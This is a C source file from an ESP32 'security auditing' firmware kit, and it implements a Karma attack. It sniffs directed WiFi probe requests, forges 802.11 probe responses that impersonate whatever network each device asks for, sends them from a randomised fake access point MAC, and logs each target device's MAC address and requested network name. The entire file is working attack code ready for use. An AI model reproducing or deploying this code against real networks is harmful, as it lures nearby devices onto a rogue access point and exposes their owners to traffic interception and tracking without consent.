/*
 * ChL-CyberKit v1.0 PRO — ESP32 WiFi/BLE Security Auditing Framework
 * Copyright (C) 2026  ChL (Pedro Reza) <pedrorezabala26@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * @file karma_attack.c
 * @brief Karma Attack — responde probe requests dirigidos.
 * @author Pedro Luis Rezabala — ChL-CyberKit v1.0 PRO
 */

#include "karma_attack.h"

#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

#include <string.h>
#include <stdint.h>

static const char *TAG = "karma";

/* ── Estado global ───────────────────────────────────────────────────────── */
static volatile karma_state_t  s_state = KA_IDLE;
static SemaphoreHandle_t       s_mutex = NULL;
static karma_stats_t           s_stats;

/* MAC del AP falso (local bit set = 0x02) */
static uint8_t s_fake_mac[6] = {0x02, 0xCA, 0xFE, 0x00, 0x00, 0x01};

/* ── Probe Response builder ──────────────────────────────────────────────── */
/*
 * Probe Response frame layout (802.11):
 *   FC[2] Dur[2] DA[6] SA[6] BSSID[6] SeqCtl[2]
 *   Timestamp[8] BeaconInterval[2] Capability[2]
 *   SSID_IE[2+n] Rates_IE[10] DS_IE[3]
 */
static void send_probe_response(const uint8_t *sta_mac,
                                 const char    *ssid,
                                 uint8_t        channel)
{
    uint8_t ssid_len = (uint8_t)strnlen(ssid, 32);
    if (ssid_len == 0) return;

    /* Max frame: 50 fixed + 32 SSID = 82 bytes, well within tx limit */
    uint8_t frame[90];
    memset(frame, 0, sizeof(frame));
    int i = 0;

    /* Frame Control: Probe Response (type=0 mgmt, subtype=5 → 0x50) */
    frame[i++] = 0x50; frame[i++] = 0x00;
    /* Duration */
    frame[i++] = 0x00; frame[i++] = 0x00;
    /* DA = requesting station */
    memcpy(frame + i, sta_mac, 6);   i += 6;
    /* SA = fake AP MAC */
    memcpy(frame + i, s_fake_mac, 6); i += 6;
    /* BSSID = fake AP MAC */
    memcpy(frame + i, s_fake_mac, 6); i += 6;
    /* Sequence control */
    frame[i++] = 0x00; frame[i++] = 0x00;
    /* Timestamp: 0 (8 bytes) */
    i += 8;
    /* Beacon interval: 100 TU */
    frame[i++] = 0x64; frame[i++] = 0x00;
    /* Capability: ESS + ShortPreamble + ShortSlot */
    frame[i++] = 0x31; frame[i++] = 0x04;
    /* IE 0: SSID */
    frame[i++] = 0x00;
    frame[i++] = ssid_len;
    memcpy(frame + i, ssid, ssid_len); i += ssid_len;
    /* IE 1: Supported Rates (11b/g) */
    frame[i++] = 0x01; frame[i++] = 0x08;
    frame[i++] = 0x82; frame[i++] = 0x84; /* 1, 2 Mbps (basic) */
    frame[i++] = 0x8B; frame[i++] = 0x96; /* 5.5, 11 Mbps (basic) */
    frame[i++] = 0x24; frame[i++] = 0x30; /* 18, 24 Mbps */
    frame[i++] = 0x48; frame[i++] = 0x6C; /* 36, 54 Mbps */
    /* IE 3: DS Parameter Set (current channel) */
    frame[i++] = 0x03; frame[i++] = 0x01;
    frame[i++] = (channel > 0 && channel <= 13) ? channel : 6;

    esp_wifi_80211_tx(WIFI_IF_AP, frame, i, false);
}

/* ── Hook llamado desde sniffer.c ────────────────────────────────────────── */
void karma_attack_handle_mgmt(const uint8_t *payload, uint32_t len)
{
    if (s_state != KA_RUNNING) return;

    /* Management frame FC: byte 0 = subtype<<4 | type
     * Probe Request: type=0 (mgmt), subtype=4 → FC[0]=0x40 */
    if (len < 28) return;
    if (payload[0] != 0x40 || payload[1] != 0x00) return;

    /* 802.11 management frame header: FC(2)+Dur(2)+DA(6)+SA(6)+BSSID(6)+SeqCtl(2) = 24 bytes
     * SA (source = the probing device) is at offset 10 */
    const uint8_t *sta_mac = payload + 10;

    /* SSID IE starts at byte 24 */
    if (len < 26) return;
    if (payload[24] != 0x00) return; /* not SSID IE tag */
    uint8_t ssid_len = payload[25];
    if (ssid_len == 0) return;       /* broadcast probe — ignore */
    if (ssid_len > 32) return;
    if ((uint32_t)(26 + ssid_len) > len) return;

    char ssid[33] = {0};
    memcpy(ssid, payload + 26, ssid_len);

    /* Get current channel for the response */
    uint8_t primary_ch = 6;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&primary_ch, &second);

    send_probe_response(sta_mac, ssid, primary_ch);

    /* Update stats (no mutex needed for volatile reads in ISR-safe context) */
    if (xSemaphoreTake(s_mutex, 0) == pdTRUE) {
        s_stats.probes_seen++;
        s_stats.responses_sent++;
        memcpy(s_stats.last_sta, sta_mac, 6);
        strncpy(s_stats.last_ssid, ssid, 32);
        xSemaphoreGive(s_mutex);
    }

    ESP_LOGI(TAG, "→ SSID:'%s' STA:%02X:%02X:%02X:%02X:%02X:%02X",
             ssid,
             sta_mac[0], sta_mac[1], sta_mac[2],
             sta_mac[3], sta_mac[4], sta_mac[5]);
}

/* ── API pública ─────────────────────────────────────────────────────────── */

bool karma_attack_start(void)
{
    if (s_state == KA_RUNNING) return true;

    if (!s_mutex) {
        s_mutex = xSemaphoreCreateMutex();
        if (!s_mutex) return false;
    }

    /* Randomise fake AP MAC */
    uint32_t r = esp_random();
    s_fake_mac[3] = (r >> 16) & 0xFF;
    s_fake_mac[4] = (r >>  8) & 0xFF;
    s_fake_mac[5] =  r        & 0xFF;

    memset(&s_stats, 0, sizeof(s_stats));
    s_state = KA_RUNNING;

    ESP_LOGI(TAG, "Karma Attack iniciado — fake MAC: %02X:%02X:%02X:%02X:%02X:%02X",
             s_fake_mac[0], s_fake_mac[1], s_fake_mac[2],
             s_fake_mac[3], s_fake_mac[4], s_fake_mac[5]);
    return true;
}

void karma_attack_stop(void)
{
    if (s_state == KA_IDLE) return;
    s_state = KA_IDLE;
    ESP_LOGI(TAG, "Karma Attack detenido | vistos=%lu enviados=%lu",
             (unsigned long)s_stats.probes_seen,
             (unsigned long)s_stats.responses_sent);
}

karma_state_t karma_attack_get_state(void) { return s_state; }

karma_stats_t karma_attack_get_stats(void)
{
    karma_stats_t snap;
    if (s_mutex && xSemaphoreTake(s_mutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        snap = s_stats;
        xSemaphoreGive(s_mutex);
    } else {
        snap = s_stats; /* best-effort */
    }
    return snap;
}
